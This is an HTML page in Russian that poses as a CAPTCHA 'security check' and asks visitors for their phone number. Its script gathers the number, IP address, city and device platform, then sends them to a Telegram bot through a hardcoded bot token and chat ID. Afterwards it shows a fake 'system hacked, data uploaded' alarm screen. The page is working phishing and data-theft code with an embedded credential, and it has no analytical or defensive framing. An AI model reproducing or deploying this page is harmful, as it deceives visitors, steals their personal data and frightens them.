<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Security Check</title>
    <style>
        body { background: #000; margin: 0; color: #0f0; font-family: 'Courier New', monospace; font-size: 13px; overflow-x: hidden; }
        #captcha-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #fff; color: #000; text-align: center; }
        .welcome-text { color: #888; font-size: 12px; margin-bottom: 10px; font-family: Arial, sans-serif; }
         
        .phone-input { 
            padding: 12px; 
            font-size: 18px; 
            border: 2px solid #ddd; 
            border-radius: 5px; 
            width: 250px; 
            margin-top: 15px; 
            text-align: center;
            outline: none;
        }
        .phone-input:focus { border-color: #007bff; }

        .btn-verify { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 15px; font-weight: bold; width: 278px; }
        #terminal { display: none; padding: 20px; line-height: 1.4; height: 100vh; overflow: hidden; background: #000; color: #0f0; }
        #leak-box { display: none; padding: 20px; background: #000; height: 100vh; animation: alarm-red 0.6s infinite alternate; }
        @keyframes alarm-red { from { background: #000; } to { background: #300; } }
        .danger-ui { border: 3px solid #f00; padding: 25px; margin: 20px auto; max-width: 650px; background: rgba(0, 0, 0, 0.95); box-shadow: 0 0 40px #f00; }
        .glitch-text { color: #f00; font-size: 26px; text-align: center; font-weight: bold; text-transform: uppercase; letter-spacing: 3px; margin: 0; }
        .data-list { color: #0f0; font-size: 14px; margin-top: 15px; line-height: 1.6; }
        .red-blink { color: #f00; font-weight: bold; animation: blink 0.4s step-end infinite; }
        @keyframes blink { 50% { opacity: 0; } }
        hr { border: 0; border-top: 2px solid #f00; margin: 15px 0; }
    </style>
</head>
<body>
    <div id="terminal"></div>

    <div id="captcha-box">
        <div class="welcome-text">Добро пожаловать</div>
        <img src="https://www.google.com" width="120">
        <h2>Проверка безопасности</h2>
        <p style="font-size: 14px; color: #555;">Введите номер телефона для подтверждения личности</p>
        
        <input type="tel" id="user-phone" class="phone-input" placeholder="+7 (___) ___-__-__" required>
        <br>
        <button class="btn-verify" onclick="startProcess()">Я НЕ РОБОТ</button>
    </div>

    <div id="leak-box">
        <div class="danger-ui">
            <p class="glitch-text">⚠ СИСТЕМА ВЗЛОМАНА ⚠</p>
            <hr>
            <div class="data-list">
                <p>> СТАТУС: <span class="red-blink">КРИТИЧЕСКАЯ УТЕЧКА</span></p>
                <p>> ВАШ IP: <span id="display-ip" style="color:#fff;">...</span></p>
                <p>> ГОРОД: <span id="display-geo" style="color:#fff;">...</span></p>
                <p>> УСТРОЙСТВО: <span id="display-os" style="color:#fff;">...</span></p>
                <p style="color: #f00; font-weight: bold; margin-top: 20px;">⚡ ДАННЫЕ ВЫГРУЖЕНЫ НА СЕРВЕР.</p>
            </div>
        </div>
    </div>

    <script>
        const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
        const chat_id = "-1003861311533";

        async function startProcess() {
            const phone = document.getElementById('user-phone').value;
            
            if (phone.length < 7) {
                alert("Пожалуйста, введите корректный номер телефона");
                return;
            }

            document.getElementById('captcha-box').style.display = 'none';
            document.getElementById('terminal').style.display = 'block';

          
            const lines = [
                "> [INIT] Запуск протокола проверки...",
                "> [INFO] Поиск совпадений в базе...",
                "> [WARN] Обнаружена критическая уязвимость",
                "> [SYSTEM] Перехват сессии...",
                "> [SUCCESS] Данные синхронизированы",
                "> [DONE] ОТЧЕТ СФОРМИРОВАН."
            ];

            for (let line of lines) {
                let p = document.createElement('p');
                p.innerText = line;
                document.getElementById('terminal').appendChild(p);
                window.scrollTo(0, document.body.scrollHeight);
                await new Promise(r => setTimeout(r, 150)); 
            }

            await sendReport(phone);
        }

        async function sendReport(phoneNumber) {
       
            let visits = localStorage.getItem('v_count') || 0;
            visits = parseInt(visits) + 1;
            localStorage.setItem('v_count', visits);

            let ip = "N/A", city = "N/A";
            const time = new Date().toLocaleString();

            
            try {
                const ipRes = await fetch('https://api64.ipify.org?format=json').catch(() => null);
                if (ipRes) ip = (await ipRes.json()).ip;
                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`).catch(() => null);
                if (geoRes) {
                    const d = await geoRes.json();
                    city = `${d.city}, ${d.country_name}`;
                }
            } catch(e){}

          
            document.getElementById('display-ip').innerText = ip;
            document.getElementById('display-geo').innerText = city;
            document.getElementById('display-os').innerText = navigator.platform;

            let message = "";
            if (visits === 1) {
                message = `🚀 **НОВЫЙ КЛИЕНТ**\n` +
                          `📞 НОМЕР: \`${phoneNumber}\`\n` +
                          `📍 IP: ${ip}\n` +
                          `🌍 ГОРОД: ${city}\n` +
                          `📱 УСТРОЙСТВО: ${navigator.platform}\n` +
                          `⏰ ВРЕМЯ: ${time}`;
            } else {
                message = `♻️ **ПОВТОРНЫЙ ПЕРЕХОД #${visits}**\n` +
                          `📞 НОМЕР: \`${phoneNumber}\`\n` +
                          `📍 IP: ${ip}`;
            }

       
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&parse_mode=markdown&text=${encodeURIComponent(message)}`);

         
            setTimeout(() => {
                document.getElementById('terminal').style.display = 'none';
                document.getElementById('leak-box').style.display = 'block';
            }, 500);
        }
    </script>
</body>
</html>
